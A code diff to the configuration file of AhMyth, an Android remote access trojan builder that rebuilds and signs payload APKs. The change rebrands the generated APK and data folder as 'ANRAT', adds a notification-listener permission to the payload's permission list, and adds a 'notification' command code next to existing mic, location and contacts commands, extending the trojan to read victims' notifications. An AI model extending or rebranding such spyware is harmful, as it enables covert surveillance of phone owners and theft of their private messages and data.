@@ -2,14 +2,14 @@ const path = require('path');
 
 
 //---------------------App Controller Vars----------------------------------
-exports.apkName = 'Ahmyth.apk';
+exports.apkName = 'ANRAT.apk';
 exports.apkSourceName = 'Ahmyth';
 exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
 exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
 exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
 exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
 exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
-exports.dataDir = 'AhMyth'
+exports.dataDir = 'ANRAT'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
 exports.outputLogsPath = 'Logs';
@@ -49,7 +49,8 @@ exports.permissions = [
   'android.permission.ACCESS_FINE_LOCATION',
   'android.permission.ACCESS_COARSE_LOCATION',
   'android.permission.ACCESS_BACKGROUND_LOCATION',
-  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS'
+  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
+  'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE'
 ];
 exports.checkboxMap = {
   Permissions1: [
@@ -146,5 +147,5 @@ exports.orders = {
   mic: 'x0000mc',
   location: 'x0000lm',
   contacts: 'x0000cn',
-
+  notification: 'x0000nf',
 }
